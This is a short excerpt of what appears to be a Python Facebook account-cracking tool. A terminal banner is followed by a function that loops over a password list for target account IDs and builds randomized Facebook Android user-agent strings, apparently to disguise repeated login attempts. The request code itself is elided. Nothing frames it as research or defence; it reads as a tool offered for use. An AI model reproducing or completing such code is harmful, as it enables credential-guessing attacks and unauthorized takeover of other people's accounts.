...
\033[1;97m[×] Version  : \033[1;32m1.1
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[Dalvik/2.1.0 (Linux; U; Android 13; M2101K7BG Build/TP1A.220624.014) [FBAN/FB4A;FBAV/458.0.0.38.86;FBPN/com.facebook.katana;FBLC/en_US;FBBV/584018436;FBCR/UNEFON;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2101K7BG;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;FBRV/585636396;]"
                li = ['28','29','210']
